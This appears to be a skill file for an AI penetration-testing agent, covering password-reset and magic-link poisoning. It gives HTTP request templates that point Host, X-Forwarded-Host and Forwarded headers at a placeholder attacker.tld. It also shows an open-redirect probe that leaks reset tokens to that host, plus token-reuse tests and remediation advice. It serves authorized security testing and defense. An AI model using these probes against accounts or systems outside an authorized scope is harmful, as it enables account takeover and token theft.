---
name: password-reset-poisoning
description: >-
  Authorized testing of password-reset and magic-link poisoning: Host /
  X-Forwarded-Host influence on reset URLs, token leakage via attacker host,
  open-redirect and cache chains, and token handling flaws. Use when reset,
  invite, or verify emails embed absolute links built from request authority.
---

# Password Reset Poisoning

## Scope And Authorization

- Authorized applications only. Trigger resets **only for accounts you own** (or program-provided mailboxes). Never reset third-party users.
- Prefer unique canary domains/collaborators you control, disposable inboxes, and one proof per sink class. Rate-limit email endpoints.
- Poisoning shared caches or mass-mailing production users is out of scope unless the program explicitly allows controlled cache tests — default to single-user email proof.
- Redact full reset tokens, links, and session cookies from public write-ups; keep complete evidence offline per policy.

## When To Use

- Forgot-password, magic-link login, email verify, invite, or “confirm device” flows send absolute HTTPS links.
- App or framework builds links from `Host`, `X-Forwarded-Host`, `Forwarded`, `:authority`, or a user-influenced base URL.
- Reset tokens appear in query/fragment and may leak via `Referer`, logs, or attacker-controlled hosts.
- Engagement wording: “password reset poisoning”, “Host header reset”, “poisoned reset link”, “token in email URL host”.
- Related Host cache issues exist but the **primary impact** is credential recovery / account takeover via email links — this skill is primary over generic Host testing.

## Core Model

```
Attacker triggers reset for victim@… (must be YOUR test account in assessment)
  Request carries Host / X-Forwarded-Host = attacker.tld
  App emails: https://attacker.tld/reset?token=SECRET
  If a real victim clicked → token hits attacker server → ATO
```

| Variant | Sink | Typical proof |
| --- | --- | --- |
| **Host header** | `Host: attacker.tld` | Email link host = attacker |
| **X-Forwarded-Host** | Edge allows XFH; app trusts proxy headers | Same with valid `Host: target` |
| **Base URL param** | `?host=`, `baseUrl=`, hidden form field | Link uses param |
| **Open redirect on reset** | Token on trusted host then `next=` off-site | Token in Referer/query to attacker |
| **Cache-aided** | Poisoned Host cached on reset template | Second client sees bad link host (rare for email body) |
| **Token logic** | Host OK but token weak/reusable/leaked | Separate handling bugs |

**Good proof:** Controlled mailbox receives reset URL whose **authority** is attacker-controlled, **or** token reaches a server you control via redirect/Referer with a complete exploit chain description.  
**Bad proof:** Only reflected Host in HTML with no email/link generation; or Host rejected at edge with no origin path.

## Workflow

1. **Inventory reset and magic-link surfaces**  
   Map:

   | Flow | Endpoints to note |
   | --- | --- |
   | Request reset | `POST /forgot-password`, `/api/auth/reset` |
   | Token consume | `GET/POST /reset-password`, `/auth/reset/confirm` |
   | Magic link | `/login/magic`, `/auth/link` |
   | Verify / invite | `/verify-email`, `/invite/accept` |

   Record Content-Type, CSRF on request form, whether email is enumerated, and rate limits. Use `api-recon-and-docs` if routes are unclear.

2. **Baseline legitimate reset**  
   With correct `Host: target.example` (and normal forwarded headers if any):

   1. Request reset for **your** test inbox.
   2. Save raw email source (headers + body).
   3. Extract link: scheme, host, path, query token names (`token`, `code`, `key`, `sig`).
   4. Complete reset once in a clean browser; note whether token is single-use, TTL, and if session is issued (then apply `session-fixation-management` if SID not rotated).

3. **Host and authority poisoning ladder**  
   Intercept the **request that triggers the email** (often POST). Keep body identity fields as your account. Mutate authority:

   ```http
   POST /forgot-password HTTP/1.1
   Host: attacker.tld
   Content-Type: application/x-www-form-urlencoded

   email=you%40test.example
   ```

   Then, with valid Host for the edge:

   ```http
   POST /forgot-password HTTP/1.1
   Host: target.example
   X-Forwarded-Host: attacker.tld
   X-Forwarded-Proto: https
   Forwarded: host=attacker.tld;proto=https
   X-Host: attacker.tld
   X-Original-Host: attacker.tld
   ```

   Also try:

   | Probe | Example | Why |
   | --- | --- | --- |
   | Port | `Host: target.example:443` vs `@` tricks | Parser split |
   | Absolute URI | `POST https://attacker.tld/forgot...` + `Host: target` | Proxy/app split |
   | Duplicate Host | two Host lines | Which layer wins |
   | HTTP/2 | `:authority: attacker.tld` vs Host | Modern edges |
   | Prefixed host | `Host: target.example.attacker.tld` | weak allowlists |

   Read the email after **each** probe. Confirmed when:

   `https://attacker.tld/.../reset?token=...` (or path-style host confusion you control).

   Do **not** use domains you do not control. Collaborator/OAST is ideal.

4. **Which request supplies the host?**  
   Some apps bake base URL when **rendering** the form (GET), not on POST:

   1. Poison Host/XFH on GET `/forgot-password`.
   2. Submit POST with clean Host (or vice versa).
   3. Document which step owns link generation.

   SPA/API splits: API may use configured `PUBLIC_URL` while legacy MVC uses Host — test both UIs.

5. **Token handling tests (same flow, distinct bugs)**  
   Even if Host is safe, continue:

   | Check | Action |
   | --- | --- |
   | Predictability | Compare multiple tokens (length, encoding, sequential) — no massive brute on prod |
   | Reuse | Complete reset twice with same token |
   | Binding | Token for user A used on user B’s email field |
   | Session after reset | Old sessions still valid? → fixation/session skill |
   | Rate limit | Cap attempts; do not lock out real users |
   | Token in Referer | Trusted reset page loads attacker image/CSS → Referer leak |
   | JSON/API reset | Host trust on API gateway vs web |

   Race double-consume → `race-condition` helper. Host-generic cache poison without reset → `http-host-header-attacks`.

6. **Open-redirect and secondary chains**  
   When the email link stays on `target.example` but includes `redirect`, `next`, `returnUrl`:

   1. Primary: complete token validation on trusted host.
   2. Then client lands on attacker URL **with token still in Referer or query**.
   3. Test with `open-redirect` payload ladder on those parameters.

   ```http
   GET /reset?token=CANARY&next=https://attacker.tld/ HTTP/1.1
   Host: target.example
   ```

   Capture whether `Referer: https://target.example/reset?token=CANARY` hits attacker logs. Impact = token theft without Host poisoning.

   OAuth password reset / “login with email” hybrids may need `oauth-oidc-misconfiguration`.

7. **CSRF on reset request vs reset confirm**  
   - Cross-site **request** of reset email (spam/DoS) — usually low; note if no CSRF.  
   - Cross-site **confirm** that sets password without token or with leaked token — high; use `csrf-cross-site-request-forgery`.  
   - Reset confirm that establishes session without regenerate → `session-fixation-management`.

8. **Cache interaction (optional)**  
   If reset **page** HTML embeds absolute “request another link” URLs and is cacheable, Host/XFH unkeyed headers may poison the page for others. Prefer email proof for ATO severity. Full cache methodology: `http-host-header-attacks` / `web-cache-deception` as appropriate. Do not mass-poison production CDNs.

9. **Origin vs edge**  
   Document:

   - Edge rejects unknown `Host` (CDN 403) but origin accepts when hit directly (if origin is in scope).  
   - App trusts `X-Forwarded-*` from **any** client (missing trusted-proxy config).  
   - Only internal header from LB is honored — not exploitable from Internet; still report defense-in-depth if origin is reachable.

10. **Remediation guidance**  
    Pair implementation with `code-quality-standards`:

    - Build email links from a **configured canonical base URL** (`APP_URL` / `PUBLIC_URL`), never from raw `Host` / XFH.  
    - If behind proxies: trust `X-Forwarded-Host` **only** from known proxy IPs; ignore client-supplied overrides.  
    - Allowlist Host at the edge; reject unknown authorities.  
    - Tokens: high entropy, single-use, short TTL, bound to user id and purpose; HTTPS-only links.  
    - After successful reset: invalidate sessions, regenerate session id, optional notify old email.  
    - Avoid putting long-lived tokens in URLs that later redirect off-site; prefer POST body + SameSite session step.  
    - Do not reveal whether an email exists unless product requires it; rate-limit per IP and per account.

## Routing

| Need | Skill |
| --- | --- |
| Broad Host/XFH/cache/vhost (not only reset) | `http-host-header-attacks` |
| `next=` / return URL after reset | `open-redirect` |
| JWT/API auth outside reset email links | `api-auth-and-jwt-abuse` |
| CSRF on password change / confirm | `csrf-cross-site-request-forgery` |
| Session not rotated after reset login | `session-fixation-management` |
| OAuth magic-link / IdP email flows | `oauth-oidc-misconfiguration` |
| SSRF if server **fetches** reset URL host | `ssrf-server-side-request-forgery` |
| Secure link generation and token code | `code-quality-standards` |

## Output Checklist

- [ ] Flow(s): forgot / magic / verify / invite
- [ ] Baseline email link (host redacted pattern) vs poisoned link
- [ ] Header(s) that influenced authority (`Host`, XFH, `Forwarded`, `:authority`, params)
- [ ] GET form vs POST send responsibility
- [ ] Token properties: entropy notes, reuse, binding, TTL
- [ ] Redirect/Referer chain if any
- [ ] Edge vs origin differences
- [ ] Impact: ATO path with **your** account evidence only
- [ ] Remediation: canonical base URL, proxy trust, token lifecycle, session invalidate

## Rules

- Only your mailboxes and canary domains. No third-party password resets.
- One clean email proof per header class is enough; do not flood.
- “Reflected Host in HTML” without mail or security decision is not full reset poisoning — escalate severity only with token/link impact.
- Distinguish **poisoned host in email** (this skill) from **generic Host cache poison** (`http-host-header-attacks`).
- Never paste live reset tokens into public issues; use redaction (`token=REDACTED_len_43`).
- Authorized assessment only; stop if mail systems or WAF indicate account lockout risk to others.
